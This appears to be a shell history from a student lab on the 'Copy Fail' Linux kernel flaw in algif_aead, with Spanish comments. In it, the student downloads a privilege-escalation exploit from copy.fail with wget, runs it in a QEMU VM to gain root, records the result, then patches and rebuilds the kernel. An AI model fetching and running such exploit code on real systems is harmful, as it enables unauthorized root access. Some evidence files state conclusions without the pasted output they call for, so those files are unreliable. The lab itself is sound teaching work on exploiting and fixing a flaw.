  334  cd /workspaces/copy-fail-challenge-B-ok
  335  ROOTFS=/tmp/cf-rootfs
  336  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  337  # Extraer initramfs actual limpio al rootfs temporal
  338  rm -rf "$ROOTFS"
  339  mkdir -p "$ROOTFS"
  340  cd "$ROOTFS"
  341  gzip -dc "$INITRAMFS" | cpio -idmv >/dev/null 2>&1
  342  cd /workspaces/copy-fail-challenge-B-ok
  343  # Reemplazar /usr/bin/su por el su real del Codespace
  344  mkdir -p "$ROOTFS/usr/bin"
  345  rm -f "$ROOTFS/usr/bin/su"
  346  cp -L /usr/bin/su "$ROOTFS/usr/bin/su"
  347  # Copiar dependencias de su
  348  ldd /usr/bin/su | awk '{for(i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | while read -r lib; do   mkdir -p "$ROOTFS$(dirname "$lib")";   e
  349  # Copiar PAM/configs necesarios
  350  mkdir -p "$ROOTFS/etc/pam.d" "$ROOTFS/etc/security" "$ROOTFS/lib/x86_64-linux-gnu"
  351  cp -a /etc/pam.d/su "$ROOTFS/etc/pam.d/su" 2>/dev/null || true
  352  cp -a /etc/pam.d/common-* "$ROOTFS/etc/pam.d/" 2>/dev/null || true
  353  cp -a /etc/login.defs "$ROOTFS/etc/login.defs" 2>/dev/null || true
  354  cp -a /etc/security/* "$ROOTFS/etc/security/" 2>/dev/null || true
  355  cp -a /lib/x86_64-linux-gnu/security "$ROOTFS/lib/x86_64-linux-gnu/" 2>/dev/null || true
  356  # /bin/su puede apuntar al su real
  357  rm -f "$ROOTFS/bin/su"
  358  ln -s /usr/bin/su "$ROOTFS/bin/su"
  359  # Pero el init debe entrar como student usando BusyBox directamente
  360  sed -i 's#exec /bin/su - student#exec /bin/busybox su - student#g' "$ROOTFS/init"
  361  sed -i 's#exec /usr/bin/su - student#exec /bin/busybox su - student#g' "$ROOTFS/init"
  362  # Permisos
  363  find "$ROOTFS" -type d -exec chmod 755 {} \;
  364  chmod 755 "$ROOTFS/init"
  365  chown root:root "$ROOTFS/usr/bin/su"
  366  chmod 4755 "$ROOTFS/usr/bin/su"
  367  find "$ROOTFS" -type f \( -name "*.so" -o -name "*.so.*" -o -name "ld-linux*" \) -exec chmod 755 {} \;
  368  # Verificación ANTES de empacar
  369  echo "=== Verificación rootfs ==="
  370  ls -l "$ROOTFS/bin/su" "$ROOTFS/usr/bin/su"
  371  file "$ROOTFS/usr/bin/su"
  372  grep -n "student" "$ROOTFS/init"
  373  # Reempacar
  374  cd "$ROOTFS"
  375  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  376  cd /workspaces/copy-fail-challenge-B-ok
  377  ls -lh kernel/build/initramfs.cpio.gz
  378  make qemu
  379  cd /workspaces/copy-fail-challenge-B-ok
  380  ROOTFS=/tmp/cf-rootfs
  381  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  382  echo "=== SU DEL HOST ==="
  383  /usr/bin/su --version || true
  384  file /usr/bin/su || true
  385  sha256sum /usr/bin/su
  386  echo "=== SU DEL ROOTFS ANTES ==="
  387  ls -l "$ROOTFS/usr/bin/su" "$ROOTFS/bin/su"
  388  file "$ROOTFS/usr/bin/su" || true
  389  sha256sum "$ROOTFS/usr/bin/su" || true
  390  strings "$ROOTFS/usr/bin/su" | grep -m1 -E "util-linux|BusyBox" || true
  391  cd /workspaces/copy-fail-challenge-B-ok
  392  ROOTFS=/tmp/cf-rootfs
  393  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  394  # Reemplazar /usr/bin/su por el su real del host
  395  rm -f "$ROOTFS/usr/bin/su"
  396  install -o root -g root -m 4755 /usr/bin/su "$ROOTFS/usr/bin/su"
  397  # /bin/su debe apuntar al real
  398  rm -f "$ROOTFS/bin/su"
  399  ln -s /usr/bin/su "$ROOTFS/bin/su"
  400  # Copiar dependencias del su real
  401  ldd /usr/bin/su | awk '{for(i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | while read -r lib; do   mkdir -p "$ROOTFS$(dirname "$lib")";   e
  402  # Copiar PAM y configuración
  403  mkdir -p "$ROOTFS/etc/pam.d" "$ROOTFS/etc/security" "$ROOTFS/lib/x86_64-linux-gnu"
  404  cp -a /etc/pam.d/su "$ROOTFS/etc/pam.d/su" 2>/dev/null || true
  405  cp -a /etc/pam.d/common-* "$ROOTFS/etc/pam.d/" 2>/dev/null || true
  406  cp -a /etc/login.defs "$ROOTFS/etc/login.defs" 2>/dev/null || true
  407  cp -a /etc/security/* "$ROOTFS/etc/security/" 2>/dev/null || true
  408  cp -a /lib/x86_64-linux-gnu/security "$ROOTFS/lib/x86_64-linux-gnu/" 2>/dev/null || true
  409  # El init debe entrar como student usando BusyBox directo
  410  sed -i 's#exec /bin/su - student#exec /bin/busybox su - student#g' "$ROOTFS/init"
  411  sed -i 's#exec /usr/bin/su - student#exec /bin/busybox su - student#g' "$ROOTFS/init"
  412  # Permisos
  413  find "$ROOTFS" -type d -exec chmod 755 {} \;
  414  chmod 755 "$ROOTFS/init"
  415  chmod 4755 "$ROOTFS/usr/bin/su"
  416  chown root:root "$ROOTFS/usr/bin/su"
  417  echo "=== VERIFICACIÓN FINAL ROOTFS ==="
  418  ls -l "$ROOTFS/bin/su" "$ROOTFS/usr/bin/su"
  419  file "$ROOTFS/usr/bin/su" || true
  420  sha256sum /usr/bin/su "$ROOTFS/usr/bin/su"
  421  strings "$ROOTFS/usr/bin/su" | grep -m1 -E "util-linux|BusyBox" || true
  422  grep -n "student" "$ROOTFS/init"
  423  cd "$ROOTFS"
  424  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  425  cd /workspaces/copy-fail-challenge-B-ok
  426  ls -lh kernel/build/initramfs.cpio.gz
  427  make qemu
  428  cd /workspaces/copy-fail-challenge-B-ok
  429  grep -E "CONFIG_CRYPTO_AUTHENCESN|CONFIG_CRYPTO_USER_API_AEAD|CONFIG_CRYPTO_AUTHENC|CONFIG_CRYPTO_AEAD|CONFIG_FUTEX|CONFIG_VIRTIO_NET" g
  430  cd /workspaces/copy-fail-challenge-B-ok
  431  grep -Rni "authencesn\|CRYPTO_AUTHENCESN" kernel/linux/crypto kernel/linux/include kernel/linux/net 2>/dev/null | head -80
  432  make qemu
  433  apt update
  434  apt install python3 wget -y
  435  wget https://copy.fail/exp -o copy_fail_exp.py
  436  chmod +x copy_fail_exp.py
  437  python3 copy_fail_exp.py
  438  wget https://copy.fail/exp -O copy_fail_exp.py
  439  rm -f copy_fail_exp.py
  440  make qemum
  441  make qemu
  442  python3 copy_fail_exp.py
  443  wget https://copy.fail/exp -O copy_fail_exp.py
  444  chmod +x copy_fail_exp.py
  445  make qemu
  446  cd /workspaces/copy-fail-challenge-B-ok
  447  make qemu
  448  cd /workspaces/copy-fail-challenge-B-ok
  449  ROOTFS=/tmp/cf-rootfs
  450  INITRAMFS="$PWD/kernel/build/initramfs.cpio.gz"
  451  # Extraer initramfs actual si el rootfs temporal no existe
  452  if [ ! -d "$ROOTFS" ]; then   rm -rf "$ROOTFS";   mkdir -p "$ROOTFS";   cd "$ROOTFS";   gzip -dc "$INITRAMFS" | cpio -idmv >/dev/null 2i
  453  copy_deps() {   local bin="$1";   ldd "$bin" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i ~ /^\//) print $i}' | while read -r lib; do }
  454  echo "=== 1. Poner /bin/sh real, NO busybox ==="
  455  SHREAL="$(command -v dash || readlink -f /bin/sh)"
  456  echo "Shell real usado: $SHREAL"
  457  rm -f "$ROOTFS/bin/sh"
  458  install -o root -g root -m 0755 "$SHREAL" "$ROOTFS/bin/sh"
  459  copy_deps "$SHREAL"
  460  echo "=== 2. Poner /usr/bin/su real con SUID ==="
  461  mkdir -p "$ROOTFS/usr/bin"
  462  rm -f "$ROOTFS/usr/bin/su"
  463  install -o root -g root -m 4755 /usr/bin/su "$ROOTFS/usr/bin/su"
  464  copy_deps /usr/bin/su
  465  rm -f "$ROOTFS/bin/su"
  466  ln -s /usr/bin/su "$ROOTFS/bin/su"
  467  echo "=== 3. Mantener arranque como student usando BusyBox directo ==="
  468  sed -i 's#exec /bin/su - student#exec /bin/busybox su - student#g' "$ROOTFS/init"
  469  sed -i 's#exec /usr/bin/su - student#exec /bin/busybox su - student#g' "$ROOTFS/init"
  470  echo "=== 4. Permisos finales ==="
  471  find "$ROOTFS" -type d -exec chmod 755 {} \;
  472  chmod 755 "$ROOTFS/init"
  473  chmod 755 "$ROOTFS/bin/sh"
  474  chown root:root "$ROOTFS/usr/bin/su"
  475  chmod 4755 "$ROOTFS/usr/bin/su"
  476  find "$ROOTFS" -type f \( -name "*.so" -o -name "*.so.*" -o -name "ld-linux*" \) -exec chmod 755 {} \;
  477  echo "=== VERIFICACIÓN ANTES DE EMPACAR ==="
  478  ls -l "$ROOTFS/bin/sh" "$ROOTFS/bin/su" "$ROOTFS/usr/bin/su"
  479  file "$ROOTFS/bin/sh" "$ROOTFS/usr/bin/su" || true
  480  grep -n "student" "$ROOTFS/init"
  481  echo "=== Reempacando initramfs ==="
  482  cd "$ROOTFS"
  483  find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -9 > "$INITRAMFS"
  484  cd /workspaces/copy-fail-challenge-B-ok
  485  ls -lh kernel/build/initramfs.cpio.gz
  486  make qemu
  487  cd /workspaces/copy-fail-challenge-B-ok
  488  mkdir -p evidence
  489  code evidence/hito2_root_shell.txt
  490  cd /workspaces/copy-fail-challenge-B-ok
  491  mkdir -p evidence
  492  cat > evidence/hito2_root_shell.txt <<'EOF'
=== HITO 2: EXPLOTACIÓN EXITOSA ===

Usuario inicial dentro de la VM:
student

Comando ejecutado:
python3 copy_fail_exp.py

Resultado esperado:
Se obtiene una shell con privilegios de root, identificada por el símbolo #.

Evidencia obtenida:

# id
uid=0(root) gid=0(root) groups=0(root)

# whoami
root

Kernel vulnerable:
6.12.0

Descripción técnica:
El exploit copy_fail_exp.py fue ejecutado dentro de la VM QEMU como usuario student.
Después de ejecutar el PoC, el sistema permitió obtener una shell root.
Esto confirma la escalación de privilegios local en el entorno vulnerable del laboratorio.

Conclusión:
El Hito 2 fue completado exitosamente porque se logró pasar de un usuario sin privilegios a root.
EOF

  493  cat evidence/hito2_root_shell.txt
  494  git add evidence/hito2_root_shell.txt
  495  git commit -m "hito-2: exploit exitoso y root obtenido"
  496  git tag -a hito-2 -m "Root shell obtenida con Copy Fail"
  497  git push origin main --tags
  498  make qemu
  499  cd /workspaces/copy-fail-challenge-B-ok
  500  mkdir -p evidence
  501  cat > evidence/hito3_mitigation.txt <<'EOF'
=== HITO 3: MITIGACIÓN TEMPORAL ===

Pega aquí la salida completa de /tmp/hito3.txt.
EOF

  502  code evidence/hito3_mitigation.txt
  503  git add evidence/hito3_mitigation.txt
  504  git commit -m "hito-3: mitigacion temporal documentada"
  505  git tag -a hito-3 -m "Mitigación temporal verificada"
  506  git push origin main --tags
  507  cd /workspaces/copy-fail-challenge-B-ok
  508  mkdir -p patches
  509  # Descargar parche oficial
  510  wget -O patches/fix_algif_aead_upstream.patch https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5.patch
  511  # Entrar al código fuente del kernel
  512  cd kernel/linux
  513  # Revisar si el parche aplica limpio
  514  git apply --check ../../patches/fix_algif_aead_upstream.patch
  515  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  516  # Limpiar cualquier intento parcial
  517  git restore crypto/af_alg.c crypto/algif_aead.c crypto/algif_skcipher.c include/crypto/if_alg.h 2>/dev/null || true
  518  find . -name "*.rej" -o -name "*.orig" | xargs -r rm -f
  519  # Probar con patch, que tolera offsets/fuzz
  520  patch -p1 --dry-run < ../../patches/fix_algif_aead_upstream.patch
  521  apt update
  522  apt install -y patch
  523  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  524  # limpiar intentos anteriores
  525  git restore crypto/af_alg.c crypto/algif_aead.c crypto/algif_skcipher.c include/crypto/if_alg.h 2>/dev/null || true
  526  find . -name "*.rej" -o -name "*.orig" | xargs -r rm -f
  527  # probar si el parche aplica
  528  patch -p1 --dry-run < ../../patches/fix_algif_aead_upstream.patch
  529  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  530  # Restaurar limpio
  531  git restore crypto/af_alg.c crypto/algif_aead.c crypto/algif_skcipher.c include/crypto/if_alg.h 2>/dev/null || true
  532  find . -name "*.rej" -o -name "*.orig" | xargs -r rm -f
  533  # Aplicar lo que sí calza y dejar rechazados
  534  patch -p1 --batch --reject < ../../patches/fix_algif_aead_upstream.patch || true
  535  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  536  python3 - <<'PY'
from pathlib import Path
import re

p = Path("crypto/algif_aead.c")
s = p.read_text()

# 1) Quitar include que el parche oficial elimina, si existe
s = s.replace("#include <linux/scatterlist.h>\n", "")

# 2) Ajustar variables locales viejas
s = s.replace("unsigned int i, as = crypto_aead_authsize(tfm);",
              "unsigned int as = crypto_aead_authsize(tfm);")
s = re.sub(r"\n\s*struct af_alg_tsgl \*tsgl, \*tmp;\n", "\n", s)

# 3) Reemplazar la zona vulnerable in-place por operación out-of-place
fixed_block = '''processed = used + ctx->aead_assoclen;

        /*
         * Create a per request TX SGL for this request which tracks the
         * SG entries from the global TX SGL.
         */
        areq->tsgl_entries = af_alg_count_tsgl(sk, processed);
        if (!areq->tsgl_entries)
                areq->tsgl_entries = 1;
        areq->tsgl = sock_kmalloc(sk, array_size(sizeof(*areq->tsgl),
                                                 areq->tsgl_entries),
                                  GFP_KERNEL);
        if (!areq->tsgl) {
                err = -ENOMEM;
                goto free;
        }
        sg_init_table(areq->tsgl, areq->tsgl_entries);
        af_alg_pull_tsgl(sk, processed, areq->tsgl);
        tsgl_src = areq->tsgl;

        /*
         * Copy of AAD from source to destination
         *
         * The crypto operation API call expects the AAD data to be present in
         * the source and destination scatterlists. When user space uses a
         * separate source and destination buffer, user space must provide the
         * AAD to both buffers. When user space uses an in-place cipher
         * operation, the kernel will copy the data as it does not see whether
         * such in-place operation is initiated.
         */
        /* Use the RX SGL as destination for crypto op. */
        rsgl_src = areq->first_rsgl.sgl.sgt.sgl;
        memcpy_sglist(rsgl_src, tsgl_src, ctx->aead_assoclen);

        /* Initialize the crypto operation */'''

pattern = re.compile(
    r"processed = used \+ ctx->aead_assoclen;.*?/\*\s*Initialize the crypto operation\s*\*/",
    re.S
)

s2, n = pattern.subn(fixed_block, s, count=1)
if n != 1:
    raise SystemExit("ERROR: no pude encontrar el bloque vulnerable en crypto/algif_aead.c")

s = s2

# 4) La fuente del crypto op debe ser tsgl_src, no rsgl_src
s = s.replace(
    "aead_request_set_crypt(&areq->cra_u.aead_req, rsgl_src,",
    "aead_request_set_crypt(&areq->cra_u.aead_req, tsgl_src,"
)

# 5) Nueva firma de af_alg_pull_tsgl: sin offset
s = s.replace("af_alg_pull_tsgl(sk, ctx->used, NULL, 0);",
              "af_alg_pull_tsgl(sk, ctx->used, NULL);")

# Limpiar llamadas viejas dentro de este archivo si quedaron
s = s.replace("af_alg_pull_tsgl(sk, processed, NULL, 0);",
              "af_alg_pull_tsgl(sk, processed, NULL);")
s = s.replace("af_alg_pull_tsgl(sk, processed, areq->tsgl, processed - as);",
              "af_alg_pull_tsgl(sk, processed, areq->tsgl);")

p.write_text(s)
print("[OK] crypto/algif_aead.c parcheado manualmente")
PY

  537  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  538  grep -n "af_alg_count_tsgl(sk, processed)" crypto/algif_aead.c
  539  grep -n "af_alg_pull_tsgl(sk, processed, areq->tsgl)" crypto/algif_aead.c
  540  grep -n "aead_request_set_crypt" -A2 crypto/algif_aead.c
  541  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  542  git diff -- crypto/af_alg.c crypto/algif_aead.c crypto/algif_skcipher.c include/crypto/if_alg.h > ../../patches/fix_algif_aead.patch
  543  cd /workspaces/copy-fail-challenge-B-ok
  544  ls -lh patches/fix_algif_aead.patch
  545  head -60 patches/fix_algif_aead.patch
  546  ls -lh patches/fix_algif_aead.patch
  547  head -60 patches/fix_algif_aead.patch
  548  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  549  make -j$(nproc) bzImage 2>&1 | tee /tmp/hito4_build.log
  550  echo "Código de salida:"
  551  echo ${PIPESTATUS[0]}
  552  cp arch/x86/boot/bzImage ../build/bzImage_patched
  553  cd /workspaces/copy-fail-challenge-B-ok
  554  ls -lh kernel/build/bzImage_patched
  555  cd /workspaces/copy-fail-challenge-B-ok
  556  BZIMAGE="$PWD/kernel/build/bzImage_patched" bash scripts/04_run_qemu.sh
  557  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  558  # Marcar el kernel como parcheado para que uname -r lo muestre
  559  ./scripts/config --set-str LOCALVERSION "-patched"
  560  make olddefconfig
  561  # Compilar
  562  make -j$(nproc) bzImage 2>&1 | tee /tmp/hito4_build.log
  563  echo "CODIGO_COMPILACION=${PIPESTATUS[0]}"
  564  tail -30 /tmp/hito4_build.log
  565  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  566  # Restaurar archivos auxiliares para que usen la API vieja del kernel del lab
  567  git restore crypto/af_alg.c crypto/algif_skcipher.c include/crypto/if_alg.h 2>/dev/null || true
  568  # Limpiar rechazados/originales del intento anterior
  569  find . -name "*.rej" -o -name "*.orig" | xargs -r rm -f
  570  # Adaptar algif_aead.c a la API de este kernel
  571  python3 - <<'PY'
from pathlib import Path

p = Path("crypto/algif_aead.c")
s = p.read_text()

# Tu kernel espera af_alg_count_tsgl(sk, bytes, offset)
s = s.replace(
    "af_alg_count_tsgl(sk, processed);",
    "af_alg_count_tsgl(sk, processed, 0);"
)

# Tu kernel espera af_alg_pull_tsgl(sk, used, dst, dst_offset)
s = s.replace(
    "af_alg_pull_tsgl(sk, processed, areq->tsgl);",
    "af_alg_pull_tsgl(sk, processed, areq->tsgl, 0);"
)

s = s.replace(
    "af_alg_pull_tsgl(sk, ctx->used, NULL);",
    "af_alg_pull_tsgl(sk, ctx->used, NULL, 0);"
)

# Tu kernel no tiene memcpy_sglist; usamos el helper viejo que ya existe
s = s.replace(
    "memcpy_sglist(rsgl_src, tsgl_src, ctx->aead_assoclen);",
    """err = crypto_aead_copy_sgl(null_tfm, tsgl_src, rsgl_src,
                               ctx->aead_assoclen);
        if (err)
                goto free;"""
)

p.write_text(s)
print("[OK] algif_aead.c adaptado a la API vieja del kernel del laboratorio")
PY

  572  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  573  # Restaurar archivos auxiliares para que usen la API vieja del kernel del lab
  574  git restore crypto/af_alg.c crypto/algif_skcipher.c include/crypto/if_alg.h 2>/dev/null || true
  575  # Limpiar rechazados/originales del intento anterior
  576  find . -name "*.rej" -o -name "*.orig" | xargs -r rm -f
  577  # Adaptar algif_aead.c a la API de este kernel
  578  python3 - <<'PY'
from pathlib import Path

p = Path("crypto/algif_aead.c")
s = p.read_text()

# Tu kernel espera af_alg_count_tsgl(sk, bytes, offset)
s = s.replace(
    "af_alg_count_tsgl(sk, processed);",
    "af_alg_count_tsgl(sk, processed, 0);"
)

# Tu kernel espera af_alg_pull_tsgl(sk, used, dst, dst_offset)
s = s.replace(
    "af_alg_pull_tsgl(sk, processed, areq->tsgl);",
    "af_alg_pull_tsgl(sk, processed, areq->tsgl, 0);"
)

s = s.replace(
    "af_alg_pull_tsgl(sk, ctx->used, NULL);",
    "af_alg_pull_tsgl(sk, ctx->used, NULL, 0);"
)

# Tu kernel no tiene memcpy_sglist; usamos el helper viejo que ya existe
s = s.replace(
    "memcpy_sglist(rsgl_src, tsgl_src, ctx->aead_assoclen);",
    """err = crypto_aead_copy_sgl(null_tfm, tsgl_src, rsgl_src,
                               ctx->aead_assoclen);
        if (err)
                goto free;"""
)

p.write_text(s)
print("[OK] algif_aead.c adaptado a la API vieja del kernel del laboratorio")
PY

  579  grep -n "af_alg_count_tsgl(sk, processed" crypto/algif_aead.c
  580  grep -n "af_alg_pull_tsgl(sk, processed" crypto/algif_aead.c
  581  grep -n "crypto_aead_copy_sgl(null_tfm" -A3 crypto/algif_aead.c
  582  grep -n "aead_request_set_crypt" -A2 crypto/algif_aead.c
  583  grep -n "af_alg_count_tsgl" include/crypto/if_alg.h
  584  grep -n "af_alg_pull_tsgl" include/crypto/if_alg.h
  585  make -j$(nproc) bzImage 2>&1 | tee /tmp/hito4_build.log
  586  echo "CODIGO_COMPILACION=${PIPESTATUS[0]}"
  587  cp arch/x86/boot/bzImage ../build/bzImage_patched
  588  cd /workspaces/copy-fail-challenge-B-ok
  589  ls -lh kernel/build/bzImage_patched
  590  cd /workspaces/copy-fail-challenge-B-ok/kernel/linux
  591  git diff -- crypto/algif_aead.c > ../../patches/fix_algif_aead.patch
  592  cd /workspaces/copy-fail-challenge-B-ok
  593  ls -lh patches/fix_algif_aead.patch
  594  head -80 patches/fix_algif_aead.patch
  595  cd /workspaces/copy-fail-challenge-B-ok
  596  BZIMAGE="$PWD/kernel/build/bzImage_patched" bash scripts/04_run_qemu.sh
  597  cd /workspaces/copy-fail-challenge-B-ok
  598  mkdir -p evidence
  599  cat > evidence/hito4_patched.txt <<'EOF'
=== HITO 4: PARCHE PERMANENTE APLICADO ===

PEGA AQUÍ LA SALIDA COMPLETA DE /tmp/hito4.txt

Archivo de parche generado:
patches/fix_algif_aead.patch

Kernel parcheado compilado:
kernel/build/bzImage_patched

Conclusión:
El kernel fue recompilado con el parche aplicado en crypto/algif_aead.c.
Después de ejecutar el PoC en el kernel parcheado, el usuario continúa siendo student.
Por lo tanto, el exploit quedó neutralizado.
EOF

  600  code evidence/hito4_patched.txt
  601  git add evidence/hito1_vuln_confirmed.txt evidence/hito2_root_shell.txt evidence/hito3_mitigation.txt evidence/hito4_patched.txt patcheh
  602  git commit -m "evidencias: completar hitos 1 2 3 y 4"
  603  git push origin main --tags
  604  git status
  605  git add evidence/hito1_vuln_confirmed.txt
  606  git add evidence/hito2_root_shell.txt
  607  git add evidence/hito3_mitigation.txt
  608  git add evidence/hito4_patched.txt
  609  git add patches/fix_algif_aead.patch
  610  git add kernel/linux/crypto/algif_aead.c
  611  git commit -m "final: completar evidencias y parche del laboratorio Copy Fail"
  612  git tag
  613  git tag -a hito-4 -m "Hito 4: parche permanente aplicado y exploit neutralizado"
  614  git push origin hito-4
  615  git tag
  616  git log --oneline --decorate -5
  617  history